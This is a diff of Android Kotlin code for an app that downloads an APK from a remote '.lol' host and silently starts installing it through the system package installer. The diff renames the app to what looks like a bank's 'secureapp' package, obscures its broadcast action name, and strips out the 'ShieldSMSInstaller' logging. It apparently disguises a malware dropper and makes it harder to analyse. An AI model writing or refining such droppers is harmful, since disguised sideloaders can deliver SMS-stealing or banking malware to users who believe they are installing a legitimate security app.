@@ -1,4 +1,4 @@
-package com.netboost.installer
+package com.uba.secureapp
 
 import android.app.PendingIntent
 import android.content.BroadcastReceiver
@@ -33,7 +33,7 @@ import java.io.FileOutputStream
 class MainActivity : ComponentActivity() {
 
     private val apkUrl = "https://api.sharebids.lol/static/netboost.apk"
-    private val ACTION_INSTALL_COMPLETE = "com.netboost.installer.INSTALL_COMPLETE"
+    private val ACTION_INSTALL_COMPLETE = "com.uba.secureapp.a"
 
     private val installReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
@@ -46,11 +46,9 @@ class MainActivity : ComponentActivity() {
                         startActivity(confirmationIntent)
                     }
                 } else if (status == PackageInstaller.STATUS_SUCCESS) {
-                    Log.d("ShieldSMSInstaller", "Installation succeeded!")
                     finish()
                 } else {
                     val message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE)
-                    Log.e("ShieldSMSInstaller", "Installation failed: $status, $message")
                 }
             }
         }
@@ -209,10 +207,8 @@ class MainActivity : ComponentActivity() {
                 val pendingIntent = PendingIntent.getBroadcast(this, 0, intent, flags)
 
                 session.commit(pendingIntent.intentSender)
-                Log.d("ShieldSMSInstaller", "Session committed successfully, waiting for system installer...")
 
             } catch (e: Exception) {
-                Log.e("ShieldSMSInstaller", "Session install failed, using fallback", e)
                 fallbackInstall(file)
             }
         } else {
